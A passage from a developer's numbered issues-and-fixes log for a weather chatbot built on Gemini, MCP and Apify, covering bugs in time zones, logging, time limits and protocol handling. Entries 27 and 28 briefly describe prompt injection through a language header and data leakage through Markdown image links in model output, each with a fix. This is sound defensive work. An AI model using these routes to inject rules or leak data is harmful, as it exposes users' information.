   was 12:00 in Dallas, and worked out the days on GMT days. **Fix:** every request sends `timezone=auto`. **Check:**
   `tests/unit/upstream/open-meteo.test.ts`.
3. **The design's bot text was hard to read.** *Checking our work* (the design image's pixels). White text on the teal
   bubble is 2.15:1; the minimum is 4.5:1. **Fix:** dark teal text, 5.82:1. **Check:** the axe scan in the end-to-end
   tests.

## Step 1 · The Project Skeleton

4. **Empty settings failed the settings check.** *Review.* `vercel env pull` writes some variables as empty strings, and
   an empty `VERCEL_GIT_COMMIT_SHA` broke the settings check that runs when the app starts. **Fix:** an empty value
   counts as missing (`lib/config.ts`). **Check:** `tests/unit/config.test.ts`.
5. **Lint passed with warnings.** *Review.* Biome exits with success when it finds only warnings, so a rule set to
   warn would never fail CI. **Fix:** `npm run lint` runs `biome check --error-on-warnings`.
6. **The first build-skipping command missed commits.** *Review.* Comparing with `HEAD^` looks at the last commit
   only, so a push of several commits could skip a change made in an earlier one. **Fix:** compare with
   `$VERCEL_GIT_PREVIOUS_SHA`, the last deployed commit.
7. **Every push to the repository redeploys this app.** *Deploying.* After step 1, the live build line showed
   `d053b8c`, a commit that changed only the IT Knowledge Base project; Vercel's deployment list shows it built and
   deployed. The project's "Skip deployments when there are no changes to the root directory" switch is on, but it
   only works in a monorepo with npm, Yarn, pnpm or Bun workspaces: without them, Vercel treats a change anywhere as
   global, and this repository has none. **Fix:** an Ignored Build Step command that compares this folder with the
   last deployed commit, `git diff --quiet "$VERCEL_GIT_PREVIOUS_SHA" HEAD -- .` (README, "Deploy it on Vercel", item
   4). **Status:** waiting to be set in the project's settings; until then, each push rebuilds the same code, which
   costs build minutes and nothing else.

## Step 2 · The Chat Page, From a Sample

8. **A test passed without proving anything.** *Review.* Playwright's `toContainText` reads the text inside a closed
   `<details>`, so "opens a tool chip" passed whether the chip opened or not. **Fix:** the test checks the `open`
   attribute, and that the request is visible.
9. **Code that only the tests used.** *Review.* A duration formatter and the chips' running and failed states had no
   caller yet: against the repo's rule. **Fix:** taken out, and brought back in step 3, which uses them.
10. **The end-to-end tests needed Microsoft Edge.** *Review.* They'd fail on macOS, Linux or in Codespaces. **Fix:**
    Playwright's own Chromium by default (`npx playwright install chromium`); `E2E_BROWSER_CHANNEL=msedge` uses Edge.
11. **A preview's secret could land in trace files.** *Review.* A trace records every request header, the Deployment
    Protection bypass secret included. **Fix:** no traces while that secret is set.
12. **Two MCP calls shared one JSON-RPC id.** *Review.* MCP forbids that within a session. **Fix:** ids 2 and 3, as
    the plan has them.
13. **The chips lost their open/closed arrow.** *Review.* A `<summary>` laid out as a flex row hides the browser's
    arrow. **Fix:** the chip draws its own, ▸ and ▾.
14. **Grey on mint was too faint.** *Checking our work* (contrast). The selected lane's "live from step" line was
    4.45:1. **Fix:** dark teal on the selected lane.
15. **Tables scrolled sideways on a phone.** *Checking our work* (a 360-pixel screenshot). **Fix:** tables fit the
    width, and long words wrap. **Check:** an end-to-end test that no page scrolls sideways.
16. **The deploy check never saw CI finish.** *Deploying.* Our deploy-checking script (a helper on the developer's
    machine, not in the repo) asked GitHub's API for the run of `6dac3d5` with a short commit id, but the `head_sha`
    filter matches only the full 40 characters; and it asked every 15 s, against GitHub's limit of 60 unauthenticated
    requests an hour. CI had passed all along. **Fix:** the script resolves the full id with git, asks at most once a
    minute, so one check of up to an hour stays inside the limit, and prints the API's own error messages.

## Step 3 · The Live Chat, Through REST · No Auth

17. **Atlantis is a real town.** *Testing a real API.* The plan's "can't find this place" question used Atlantis, and
    Open-Meteo found Atlantis, Western Cape, South Africa (82,736 people). **Fix:** the golden question uses Hogwarts,
    which returns nothing.
18. **Places come by relevance, not population.** *Testing a real API.* Springfield gives Missouri, Illinois, then
    Massachusetts, which is larger than Illinois. **Fix:** the ambiguity rule sorts by population itself. **Check:**
    `tests/unit/weather/ambiguity.test.ts`, on the recorded answers.
19. **A country code didn't narrow "Springfield".** *Testing a real API.* With `countryCode=US`, Springfield still
    gave all five, since all five are in the US. A region after a comma does narrow it: "Springfield, MA" gives
    Massachusetts first. **Fix:** the system prompt tells the model to write a region after a comma.
20. **Some places have no population.** *Testing a real API.* Narnia's three candidates have none. **Fix:** an
    unknown largest population counts as ambiguous, so the bot asks.
21. **AI SDK's `tool()` helper couldn't type our generic tools.** *Checking our work* (the type check). Its overloads
    can't resolve a generic input. **Fix:** the lane builds each tool object with its type written out; tool results
    are typed as JSON, so the compiler checks that the model can read them.
22. **The SDK's docs and its code disagree.** *Reading a package's code.* A tool's time limit only fires its abort
    signal, and doesn't stop the tool: our tools pass that signal to every request. A server-side time limit leaves
    the page with no error at all: the answer now carries a "cut short" mark, and the page says so.
    `@ai-sdk/react` 4.0.161 would install a second copy of `ai`: it's pinned to 4.0.160.
23. **Gemini's provider looks for another variable.** *Reading a package's code.* `@ai-sdk/google` reads
    `GOOGLE_GENERATIVE_AI_API_KEY`, and only at the first call. **Fix:** `lib/chat/model.ts` passes our
    `GOOGLE_API_KEY` itself, and checks for it first, so a missing key gets "isn't set up yet" at once.
24. **Line endings broke the format check.** *Checking our work* (Biome). Files a script rewrote on Windows got
    `\r\n` line endings in the working folder, and Biome's format check refused them. **Fix:** the scripts write `\n`.
    (`.gitattributes`, from step 1, keeps `\n` in what git stores, but can't change what a script writes.)
25. **Browser tests failed under load.** *Checking our work* (the tests). Run alongside a build, 7 checks timed out (an
    accessibility scan took 42 s); run alone, all passed in 15 s. **Watch:** CI's runs.
26. **A long history went to Gemini unchecked.** *Review, high.* Only your own text was measured; the bot's earlier
    answers and tool outputs had no limit. **Fix:** the whole history is at most 200,000 characters, with only the
    parts the page sends and each earlier tool call checked; the page sends only the recent messages.
27. **The browser's language went into the system prompt as is.** *Review.* Any 35 characters, new lines included,
    could add a rule. **Fix:** only a language tag, as `Intl` reads it, gets through.
28. **The model's Markdown could load images.** *Review.* An image link is fetched as soon as it's shown, which is how
    a tool's text could leak data out; and links opened in the same tab, wiping the chat. **Fix:** no images; links
    open in a new tab.
29. **An answer could end on tool calls, with no words.** *Review.* If the 5th step still called tools, the run
    stopped there. **Fix:** the 5th step can't call a tool. **Check:** `tests/unit/chat/run-chat.test.ts`.
30. **The 11th question would fail forever.** *Review.* The page sent the whole chat, so the 21st message broke the
    20-message limit, and Try again repeated it. **Fix:** the page sends the recent messages only, and New chat starts
    over.
31. **Model failures left no trace in Vercel's logs.** *Review.* A bad key or a used-up quota showed one sentence,
    and nothing else. **Fix:** `lib/logger.ts` logs each failure as one JSON line: its class and our message, never
    the question. Step 5 makes it the full logger.
32. **A Stop would have been logged as a failure.** *Review.* When the browser closes the connection, Next.js aborts
    the request with its own `ResponseAborted` error, not an `AbortError`, so a check for `AbortError` missed it.
    **Fix:** a stop is any abort whose reason isn't the tool's own time budget. **Check:**
    `tests/unit/lanes/rest-no-auth.test.ts`.
33. **Vercel's own error pages could reach the page.** *Review.* A `504` with Vercel's text would have been shown as
    is. **Fix:** the chat marks its own error responses; anything else becomes "The chat couldn't be reached."
34. **A tool's time limit said "The assistant didn't answer".** *Review.* The tool's 8 s limit came through as a raw
    abort. **Fix:** it's the weather service being slow, and the chip says so.
35. **Stopped tool calls kept running, on screen.** *Review.* After Stop, or a time limit, an unfinished chip showed
    "…" for good. **Fix:** it shows as stopped.
36. **Smaller review findings.** The wire view left out a header the request sends; the "checking the weather" text
    faded below its contrast while it pulsed; a browser test that forgot to answer `/api/chat` could have reached
    Gemini (now such a request fails by default); the Stop test relied on a fixed 5-second window; a link worked in
    the app but not on GitHub. **Fix:** each one, with a test where one fits.
37. **A README output mixed two runs.** *Checking our work* (the docs). The build output pasted into the README had
    times from one run and lines from another, and its route tree from before a new page. **Fix:** outputs are copied
    whole from one captured run.
38. **Node couldn't check HTTPS certificates on this laptop.** *Deploying* (the live checks). The golden questions
    failed before reaching the model: `UNABLE_TO_GET_ISSUER_CERT_LOCALLY`. This machine's HTTPS goes through a
    certificate that Windows trusts but Node's own list doesn't (pip has the same trouble here); the browser and Python
    use Windows' list, which is why they worked. **Fix:** on such a machine, run Node with
    `NODE_OPTIONS=--use-system-ca`, which trusts Windows' list. Vercel's servers don't need it.
39. **A golden question's check was stricter than the rule.** *Deploying* (the live checks). Tokyo's answer gave
    11.9 °C, the tool's exact value; the check wanted the rounded 12, though the plan's rule allows either. **Fix:**
    the check accepts the value as it is or rounded. One more model call went on re-asking, because an edit to the
    check hadn't saved first.
40. **The key had to be set up on Vercel.** *Deploying.* The chat reads `GOOGLE_API_KEY` from Vercel's settings. It
    was added as a Sensitive variable, so its value can't be read back from the dashboard, for Production only. We
    checked it by name, not by value. Preview deployments won't have it: tick Preview too, to chat on them. A setting
    reaches the next deployment, not the running one.

## Step 4 · MCP · No Auth, Through Our Own MCP Server

41. **The plan's MCP handshake is now one request.** *Reading the requests.* AI SDK's MCP client and `mcp-handler`
    speak MCP's 2026-07-28 version, which keeps no session: the client opens with one `server/discover`, not
    `initialize` and its follow-up notice, and every request names its method and tool in headers (`mcp-method`,
    `mcp-name`) and carries the protocol version and the client's name in `_meta`. **Fix:** the docs and the compare
    view show the request as it's really sent; the server still answers 2025-era clients.
42. **An MCP tool result may have no content list.** *Checking our work* (the type check). The client types a tool
    result as a union of the current form and older ones, some without `content`. **Fix:** the lane reads the text
    only when `content` is a list.
43. **Error classes by name.** *Checking our work* (lint). The MCP server sends a failed tool's class by name; a map
    keyed by class names broke the naming rule, and a class's own constructor name can change when the code is
    minified. **Fix:** a `switch` over the names each class sets itself (`toAppErrorByName`).
44. **MCP's `_meta` key broke a naming rule.** *Checking our work* (lint). `_meta` is MCP's name, not ours, and its
    leading underscore failed the file's naming rule. **Fix:** that file's rule ignores one leading underscore.
45. **One request could carry 100 tool calls.** *Review, high.* `/api/mcp` is public, and the MCP SDK takes a JSON-RPC
    batch of up to 100 messages, in up to 4 MB, on its 2025-era path: one POST could make up to 200 Open-Meteo calls
    from our servers (with retries), past any per-request rate limit (entry 65 corrects "thousands"). **Fix:** each
    request is checked first: one message at a time, at most 8 KB (`lib/weather/mcp-request.ts`). **Check:**
    `tests/unit/weather/mcp-request.test.ts`.
46. **MCP undid a time-limit fix.** *Review.* On MCP · no auth, a tool past its 8 s budget came through as a raw abort
    ("The assistant didn't answer"), unlogged on both sides: entry 34's problem again, on the default lane. **Fix:**
    one helper, `toAbortKind`, tells a time limit from a stop for every lane; a time limit is logged and becomes
    `UpstreamTimeoutError`. **Check:** `tests/unit/lanes/mcp-no-auth.test.ts`.
47. **The MCP call's address came from the request's Host header.** *Review.* Safe on Vercel, which only routes its own
    domains here; but on any other host, a forged `Host` could send the call, and the bypass secret, elsewhere. **Fix:**
    on Vercel, the lane uses the request's address only if it's one of the deployment's own (Vercel lists them), else
    the deployment's own URL. **Check:** `tests/unit/lanes/open-lane.test.ts`.
48. **A cached MCP answer said no request went out.** *Review.* On MCP the `tools/call` does go out; only the server's
    call to Open-Meteo is skipped. **Fix:** the chip says "cached", keeps the call's time, and explains per lane.
49. **A failed connection lost its cause.** *Review.* A preview's `401` from Deployment Protection became "can't be
    reached", and only that was logged. **Fix:** the original error is kept as the cause and logged with its own class.
50. **The public server could send a bug's own text.** *Review.* A failure that wasn't ours (a `TypeError`, say) went
    to any MCP client as it was. **Fix:** a fixed sentence, "The weather tool failed unexpectedly."
51. **MCP's untested paths.** *Review.* Stop, the tool's time budget, two calls at once, a missing tool and a failed
    tool list had no test on MCP, and one test waited 3 real seconds. **Fix:** a test for each; the connect budget can
    be passed in.
52. **A failed connection was logged twice, and a Stop once.** *Review.* The lane logged a failed MCP connection, then
    the chat route logged it again, and the route also logged a Stop during connecting as a failure. **Fix:** a failure
    is logged once, where it happens: the lanes log their own; the route logs only a missing setting and anything
    unexpected, and never a stop.
53. **Only one production domain is known.** *Review.* Vercel names the shortest production domain only; with a custom
    domain added, chats through the `vercel.app` address would call the protected deployment URL. **Fix:** the deploy
    notes say to turn on Protection Bypass for Automation along with adding a domain.

## Step 5 · Errors and Logs

54. **A bad tool call's chip said "The assistant didn't answer."** *Checking our work* (the tests). AI SDK 7 sends a bad
    call to the page twice: once for its input, with AI SDK's own error, and once for its output, with only that error's
    text (`"AI_InvalidToolInputError: ..."`). Our sentence matched the error itself, so the chip, which shows the
    second, got the general sentence: since step 3. **Fix:** `toAppError()` knows AI SDK's two bad-call names in the
    text too; the log line comes from the tool call itself, which AI SDK marks `invalid`. **Check:**
    `tests/unit/chat/error-map.test.ts`, `tests/unit/errors.test.ts`.
55. **pino's default stream could drop a function's last lines.** *Reading a package's code.* Without a destination,
    pino writes to stdout through sonic-boom without waiting, so a function that ends right after a line, as each answer
    does with `chat.done`, could stop before the line is out. **Fix:** `pino.destination({ dest: 1, sync: true })`.
    **Check:** the live logs: every line of a live answer reached Vercel's, `chat.done` included (29 October 2026).
56. **Our MCP server's setup can't see the request.** *Reading a package's code.* mcp-handler builds a fresh MCP
    server for every request, but the setup function it calls isn't given the request, so it can't read the request
    id there. **Fix:** each tool reads it from the request the MCP SDK passes the tool (`ctx.http.req`). **Check:**
    `tests/unit/weather/register-tools.test.ts`.
57. **The chat id went into the logs as sent.** *Checking our work.* useChat makes the chat's id from letters and
    digits, but any client could send an email address in it, and every line logs it. **Fix:** an id must look like
    one useChat makes, or the request is refused. **Check:** `tests/unit/chat/chat-request.test.ts`.
58. **The tests' model failures weren't Gemini's.** *Checking our work* (the tests). A plain `Error` from the mock
    model, as step 3's test threw, now reads as a bug; and a 503 made AI SDK retry twice, for about 6 s, past the test's
    5 s. **Fix:** the tests throw what AI SDK throws for Gemini: an `APICallError`, and after its retries a
    `RetryError`.
59. **Sentry needs your account.** *Checking our work.* The plan had Sentry in this step, but it needs an account and a
    project key that only you can create. **Fix:** it moves to step 9, with the other services that take the logs
    elsewhere; the plan and step 5's page say so.
60. **A bad call's log line quoted the model's input.** *Review.* AI SDK's message for invalid input embeds the input
    itself (`Type validation failed: Value: {...}`), and our line logged it twice, as the message and as the cause: a
    place, or coordinates to 7 decimals, in the logs. **Fix:** a bad call's line says what went wrong in our own words,
    with no cause, and names the tool only if it's one of ours. **Check:** `tests/unit/chat/error-map.test.ts`.
61. **A model failure after a finished step ended twice.** *Review.* AI SDK calls `onEnd` once any step has finished,
    even after `onError`, so Gemini failing on its second call logged `chat.failed`, then `chat.done`. **Fix:**
    `chat.done` is skipped once the answer has failed. **Check:** `tests/unit/chat/run-chat.test.ts`, a model that
    fails on its second call.
62. **Anyone could file `/api/mcp`'s lines under any id.** *Review.* The public server takes a caller's `x-request-id`,
    so an outside client could put its lines under a chat's id, and Vercel's own id for the request was never logged.
    **Fix:** each line there also carries `invocationId`, Vercel's id for that request. **Check:**
    `tests/unit/weather/register-tools.test.ts`.
63. **Every AI SDK error read as the model failing.** *Review.* Our own messages failing to convert
    (`MessageConversionError`) and the MCP client's errors are AI SDK errors too, so they'd have said "The assistant
    didn't answer" and counted as worth retrying. **Fix:** `ModelError` is only for Gemini's own failures as AI SDK
    reports them: an HTTP error, its retries giving up, an error inside the stream (a `StreamProviderError`, which AI
    SDK makes from Gemini's error chunk), or no answer; anything else is a bug. **Check:** `tests/unit/errors.test.ts`.
64. **A question's hash could be guessed back.** *Review.* An unsalted SHA-256 of "Weather in Paris?" is found by
    hashing likely questions, so the hash was the question in another form. **Fix:** only the question's length is
    logged; `hashText` is gone, from the code and the plan.
65. **Entry 45 said "thousands".** *Checking our work* (writing the bug stories). The MCP SDK caps a batch at 100
    messages (`MAX_BATCH_SIZE` in `@modelcontextprotocol/server` 2.4.0), so one request could carry up to 100 tool
    calls. **Fix:** entry 45, step 4's page, the guard's comment and its test say so; the guard stays, since a
    per-request limit still counts those 100 calls as one.
66. **Vercel showed the MCP server's lines twice.** *Deploying.* In Vercel's logs, each `mcp.call` and `upstream.http`
    line of a live answer showed twice, under `/api/mcp` and under `/api/chat`, with the same time to the millisecond:
    the chat request was still running when the MCP requests it made were served, and the log viewer filed each line
    under both. **Fix:** none needed in the code: each line says which function wrote it (`route`), and on `/api/mcp`
    its own `invocationId`; filter on `route` to see one function's lines.

## The System Design Page

67. **The diagram's component reached into server code.** *Checking our work* (the code rules). Its first version
    imported the diagram's data from `lib/docs/`, but the code layout lets a component import only the shared types,
    constants and helpers; data from a server file comes in as props from the page (`PLAN.md`, 7.8). **Fix:** the
    diagram's types live in `lib/types.ts`, and the page passes the data in.
68. **Four menu links crowded a phone's menu bar.** *Checking our work* (a 360-pixel screenshot). With System design
    added, "Issues and fixes" wrapped onto three lines. **Fix:** on a narrow screen, the links wrap to a second row
    instead. **Check:** the end-to-end test that no page scrolls sideways, now on `/system-design` too.
69. **The diagram said CI comes before the deployment.** *Review.* "push → CI → Vercel deploy" read as if CI had to
    pass first, but Vercel deploys a push alongside CI, and a failing CI doesn't stop it: story 8's push was live
    after 47 s, and its CI passed at 63 s. **Fix:** the diagram and the comparison say "side by side".
70. **Smaller review findings.** Open-Meteo does see something of ours: the places asked about, though never who
    asked; the question goes to Gemini as typed, as the note under the input box says; a second diagram marker in
    `docs/system-design.md` would have dropped text silently, so the build now fails without exactly one; and the
    diagram's file held four components, against one per file, so three are now plain drawing functions.

## Step 6 · REST · With Auth, Through Apify's Actor

71. **The Actor's answer isn't documented.** *Testing a real API* (the Actor's page and its dataset's schema, 29
    October 2026). Its README says each record is one location, with daily and hourly arrays, and its dataset's
    overview lists five fields, but nothing shows a whole record. **Fix:** `lib/weather/actor-items.ts` reads that
    shape, with Open-Meteo's own names inside the arrays, and checks it with Zod; any other shape is a `ContractError`
    that names the field (without an array's index, and never a value), and the lane falls back instead of guessing.
    The tests use an answer in that shape, holding Open-Meteo's real Paris numbers, and named as assumed
    (`tests/fixtures/apify/actor-paris-assumed.json`). **Check:** the first run on the live site, against the real
    thing: it wasn't that shape (entry 83).
72. **What a `402` means with a token isn't documented.** *Testing a real API.* Without a token, Apify's REST door
    answers `402` with an x402 request for payment (PLAN.md section 3, row 13), and the plan read every `402` that
    way, as an `AuthError`. But this lane never runs without a token, and Apify's docs don't say which status a
    used-up monthly credit gets. **Fix:** a `402` is a `BudgetExceededError`, at warn ("Apify's credit for this month
    is used up"), and the `lane.fallback` line keeps Apify's error type and message, so the first real one confirms
    or corrects the reading; the plan's error map (9.2) says so. **Check:** `tests/unit/upstream/apify.test.ts`.
73. **The chat page reads the token when it's built.** *Checking our work* (the build's route list: `/` is static).
    The picker's states come from the page, which Next.js prerenders once per deployment, so setting `APIFY_TOKEN`
    changes nothing until the next deployment. **Fix:** none in the code: Vercel applies a changed variable only to
    new deployments anyway, the functions included, and decrypts Secret variables during builds too; this step's page
    and the README say "then redeploy". **Check:** the live check, once a deployment is built with the token.
74. **Vercel's "Sensitive" variables are now "Secret".** *Deploying* (Vercel's docs, read while checking the token).
    Vercel now offers two types: Config, readable after saving, and Secret, write-only; Sensitive variables, like our
    Gemini key (entry 40), count as Secret. **Fix:** the README, this step's page and the system design say Secret.
75. **Stop couldn't reach the fallback, and the answer's end looked like Apify being slow.** *Checking our work*
    (writing this step's page), *then the review.* Bug story 10. **Fix:** the run's 20 s is the lane's own timer inside
    a 28 s tool budget; when the tool's signal fires, nothing falls back; the fallback's 8 s joins the same signal.
    **Check:** `tests/unit/lanes/rest-auth.test.ts`.
76. **The fallback's line would have pushed the chip's arrow down.** *Checking our work* (the chip's CSS). A chip's
    first line is a wrapping flex row; written as `display: block`, the fallback's sentence was one more item in it,
    and the row's last item, the ▸ arrow, would have wrapped onto a line of its own under the sentence. **Fix:** the
    sentence takes the row's full width and comes after the arrow (`flex-basis: 100%`, `order: 1`). **Check:** the
    browser test of a fallback, with axe.
77. **After a lane change, earlier results reached the model whole.** *Review.* Bug story 11. **Fix:** one
    `toModelWeather()` for every lane, and the history converted with every lane's tools (`HISTORY_TOOLS`). **Check:**
    `tests/unit/chat/run-chat.test.ts`.
78. **A Stop while Apify's answer arrived read as an answer we can't read.** *Review.* Reading the body fails when the
    signal fires, and that failure became a `ContractError` ("isn't JSON") before the signal was looked at, so a Stop
    fell back and logged at error. **Fix:** a failed run looks at the signal first. **Check:**
    `tests/unit/upstream/apify.test.ts`.
79. **One refusal quoted the Actor's own unit.** *Review.* "The Actor answered in °F" put a string from Apify's answer,
    of any length, into the message and its log line, against the rule that a refusal names a field, never a value.
    **Fix:** "The Actor's temperature unit isn't °C." **Check:** `tests/unit/weather/actor-items.test.ts`.
80. **Asking for `REST · with auth` without a token was an error.** *Review.* Every preview runs without the token, so
    a request for that lane, from an old tab or a script, got `503` and an error-level line, which the plan alerts on
    (9.2). **Fix:** the request's rules refuse it at info, as a broken rule: "that lane needs an Apify token, which
    this deployment doesn't have."; the `ConfigError` stays as a last guard. **Check:**
    `tests/unit/chat/chat-request.test.ts`.
81. **Our Actor tool adds `units`, which Apify's doesn't have.** *Review.* The auth pair shares the Actor tool's name
    and schema (PLAN.md 7.4, rule 9), and step 7 pins Apify's own MCP tool against ours, which won't take `units`.
    **Fix:** the plan says both auth lanes add `units` for the model and strip it before calling Apify, and step 7's
    pin compares the rest.
82. **A fallback could start without time to finish.** *Checking our work* (the plan's time budgets, 9.3). The plan
    starts a fallback only with 12 s of the answer's 50 left, the twin's 8 s and time to write the answer; the first
    version always fell back. **Fix:** with less left, the call fails with its own sentence. **Check:**
    `tests/unit/lanes/rest-auth.test.ts`.
83. **The Actor answers an item a day, not one per place.** *Deploying* (the first question with the token). Bug story
    12. **Fix:** `lib/weather/actor-items.ts` reads the real shape, an item a day or an hour, each for the place asked,
    with the days asked all there, one after another. **Check:** `tests/unit/weather/actor-items.test.ts`, against the
    Actor's real answers (`tests/fixtures/apify/`).
84. **Hourly mode gives hours only.** *Testing a real API* (two hourly questions on the live site). Its items are
    hours, with no day's summary, so our forecast would have had no days: the chip would have said "0 days, hourly",
    and the weather card would have been empty. **Fix:** a forecast of hours gets its own summary ("24 hours · 20 to
    27 °C · rain up to 17%") and no card, since a card is a row per day; hourly mode covers at most 3 days, like
    `get_forecast`'s hours. **Check:** `tests/unit/weather/tools/open-meteo-actor.test.ts`.
85. **A leftover local server showed the old diagram.** *Checking our work* (a screenshot of the new system design).
    The screenshot came from a `next start` left running on port 3124 since the System design page was built, still
    serving that build, so the new server couldn't take the port and the picture showed steps 1 to 5. **Fix:** stop
    the old server, then serve the new build; stop each server once its screenshot is taken. **Check:** the
    screenshot shows step 6's row.
86. **The place check compared the Actor's items only with each other.** *Review.* An answer that agreed with itself,
    but for another place, would have passed, and been shown as the place asked; and the days were counted, not
    checked to follow one another. **Fix:** the lane passes the coordinates it sent, which the Actor echoes, and every
    item must be within 0.01° of them; the days must follow one another; "1 day", not "1 days". **Check:**
    `tests/unit/weather/actor-items.test.ts`.
87. **"Tomorrow" by the UTC date.** *Deploying* (the live check). At 21:50 in Dallas, already 30 October in UTC, the
    model evidently took "tomorrow afternoon" to be 31 October: it said the hours it had didn't reach that afternoon;
    they did, since tomorrow there was the 30th. Earlier that evening, `REST · no auth`'s answer called the 30th "this
    afternoon". The system prompt gave the time now in UTC and said a forecast's first day is today in its place, but
    the model didn't always work out the place's own date. It predated step 6, on every lane. Bug story 13. **Fix:**
    the page sends the browser's time zone; "today" and "tomorrow" are the user's own days, wherever the place is,
    worked out in the system prompt (the user's choice, 29 October 2026); and every forecast says the place's time now
    (`localNow`). **Check:** `tests/unit/chat/system-prompt.test.ts`, `tests/unit/utils.test.ts`, two golden
    questions asked from a time zone whose date isn't UTC's (`tests/evals/golden.eval.ts`), and the live site: the
    same question at 22:50 in Dallas named Friday the 30th (bug story 13).
88. **Smaller review findings on issue 87.** *Review.* The golden questions, first asked from Dallas, could tell the
    bug apart only in Dallas's evening, when UTC's date runs ahead, and wanted the weekday named: they're now asked from
    a time zone whose date isn't UTC's at that moment (Pago Pago or Kiritimati), and take the date too. And the
    system prompt said a forecast's first day is the place's date now, untrue for a forecast cached just before the
    place's midnight: the model now finds a day by its date, and `localNow` is the time there now.

## Step 7 · MCP · With Auth, Through Apify's MCP Server

89. **A run through Apify's MCP server answers with ids, not the forecast.** *Reading a package's code* (Apify's MCP
    server, `apify/apify-mcp-server` on GitHub). Its docs said `call-actor` returns "storage IDs, not the results", and
    left open what an Actor's own tool returns; its source answers: "dataset items are not inlined". **Fix:** a run is
    two messages, the run (through `call-actor`, entry 90), then Apify's `get-dataset-items` with the run's dataset id,
    up to 100 items in one read (an hourly forecast has 72); a dataset holding more is a `ContractError`. **Check:**
    `tests/unit/upstream/apify-mcp.test.ts`.
90. **The Actor's own MCP tool can't pin the run's build, time or cost, but `call-actor` can.** *Review, medium.* The
    REST door sets `build`, `timeout` and `maxTotalChargeUsd` in its URL. As first written, the MCP lane ran the
    Actor's own tool, which takes only `waitSecs` (30 s by default, 45 at most): its runs would have used the Actor's
    default build with no cap on their charge, and our docs said the MCP door couldn't pin them. Apify's `call-actor`
    takes all three in its `callOptions` and starts the run with them (`src/tools/actors/call_actor.ts`). **Fix:** the
    lane lists `call-actor` too, and runs the Actor through it with build 1.0.9, 18 s and $0.01, and `waitSecs: 18`;
    the Actor's own tool is listed only for the pin. `call-actor` checks the input against the default build's
    schema, as the pin does, so a new default build that changes the input makes this lane fall back. Which words in
    an error result mean "can't pay" (`BudgetExceededError`) is our reading, since the server doesn't document them
    (bug story 14).
    **Check:** `tests/unit/chat/lane-examples.test.ts` (the auth pair's requests carry the same limits),
    `tests/unit/upstream/apify-mcp.test.ts`.
91. **Apify's MCP server speaks the 2025 protocol, with sessions.** *Testing a real API* (its `401`'s
    `Access-Control-Expose-Headers` names `Mcp-Session-Id`, kept in the fixture) *and reading a package's code* (AI
    SDK's MCP client first tries the 2026 discovery, waiting up to 1 s). **Fix:** the Apify client opens with
    `initialize` (`protocolVersionDiscovery: false`), on the first forecast only, and never retries a call
    (`maxRetries: 0`: a retried run would be a second, paid one); the wire view masks the session's id with the
    token. **Check:** `tests/unit/upstream/apify-mcp.test.ts`, with Apify MCP's real `401`
    through AI SDK's own client.
92. **The first MCP run's 20 s also had to hold the handshake.** *Review, low.* On REST, Apify's 18 s fit in the
    Actor call's 20 with room for the trip. On MCP, the first run's 20 s also held connecting (`initialize` and
    `tools/list`, up to 5 s) and the second message, so a slow run, near 18 s, would fall back on MCP but not on
    REST, and still be charged. **Fix:** the MCP lane's Actor call has 25 s, the run's 20 and connecting's 5, and its
    tool 33 s, with the fallback's 8. The price: after a full 25 s, a fallback needs the call to have started in the
    answer's first 13 s, not 18; it usually starts in 3 to 8. **Check:** `tests/unit/lanes/mcp-auth.test.ts`.
93. **Closing Apify's session had no time limit.** *Review, medium.* Apify's server keeps a session, which AI SDK's
    client ends on close with a `DELETE`, sent with no signal; and the answer's end waits for the lane to close. So
    every answer that ran the Actor ended one round trip to Apify late, and a `DELETE` that hung would have held the
    answer open until the function's 60 s. **Fix:** the Apify client waits at most 1 s for closing, when the lane
    closes and when a connection fails its check (`waitAtMost()` in `lib/utils.ts`); past that, the `DELETE` is left
    to finish on its own. And only the first close of an open connection runs: a lane is closed twice when an answer
    fails, the error and then the end, and a second `DELETE` would have waited its own second; a close with nothing
    open isn't kept, so a connection a run opens after it is still closed. **Check:**
    `tests/unit/upstream/apify-mcp.test.ts` (a close that never ends; two closes; a run after an early close),
    `tests/unit/utils.test.ts`.
94. **The pin didn't read the limits inside `callOptions`.** *Review, low.* Apify's server drops an input key it doesn't
    know without a word (its validator removes extra properties, and its zod parse strips them), so a renamed `build`,
    `timeout` or `maxTotalChargeUsd` would have quietly dropped our limit: bug story 14 again. **Fix:** the pin also
    requires `waitSecs`, and the three limits inside `callOptions`'s own schema, nested as zod 4 makes it (checked by
    rebuilding Apify's schema with our zod); a renamed one fails the pin, and the lane falls back, saying so.
    **Check:** `tests/unit/upstream/apify-mcp.test.ts`.
95. **Smaller review findings on step 7.** *Review.* The plan still gave both auth doors 28 s, with only the REST door
    sending `timeout=18` (now: 33 s on MCP, the slowest path 41 s of the 50, and both doors send 18 s); said the model
    sees "Apify's tool found on Apify's server", where it sees our copy; and its lane table's ④ to ⑥ left out
    `call-actor`, the second message and the second connection. "The latest build" was the default build: the one
    Apify runs, and reads the input schema from, when no build is named.
96. **An error part closes the lane while the answer may go on.** *Review, low.* `runChat` closes the lane in
    `onError`, which AI SDK calls for every error part. But Gemini's provider sends an error part for a chunk it can't
    parse and keeps streaming (`@ai-sdk/google`), and AI SDK still runs the step's tools if the step then ends with
    `stop` or `tool-calls`. So a tool call after such a part would meet a closed MCP connection and fail, and the
    answer, which went on, would be logged as failed. A tool call could meet it since step 4, the first lane with a
    connection to close, and the answer has been logged as failed since step 5; step 7's Apify client no longer loses
    a connection opened after an early close (entry 93). **Fix:** the lane is closed once, by the UI message stream's
    `onEnd`, once the stream has ended or the page has gone, so tool calls after an error part find it open. Logging
    the answer as failed was right after all: the page stops at the first error chunk (entry 100). A close that fails
    is logged, `lane.close`, where AI SDK's callbacks had swallowed it. Bug story 15. **Check:**
    `tests/unit/chat/run-chat.test.ts` (an error part, then a tool call; the page going after an error; a close that
    fails). On the live site, once `214e4ec` was live, an Austin question on `MCP · with auth` ended with `chat.done`,
    and no `lane.close` line: the lane's close didn't fail.
97. **The compare view's MCP requests left out a header.** *Testing a real API* (step 7's live check). The chip's
    recorded request to Apify's server matched the compare view's cell but for `user-agent: ai-sdk/2.0.86 node.js/22`,
    which AI SDK's MCP client adds to every request: its own version, then Node's. The `MCP · no auth` cell had left
    it out since step 4, and step 7's copied it. **Fix:** both MCP cells show it, from one constant. **Check:**
    `tests/unit/chat/lane-examples.test.ts` holds both cells to the header AI SDK's real client sends, with Node's
    version as `package.json` pins it for the deployment, so an upgrade can't leave it stale.
98. **Apify's server can answer a run up to 5 s after it ends.** *Testing a real API* (the live check) *and reading
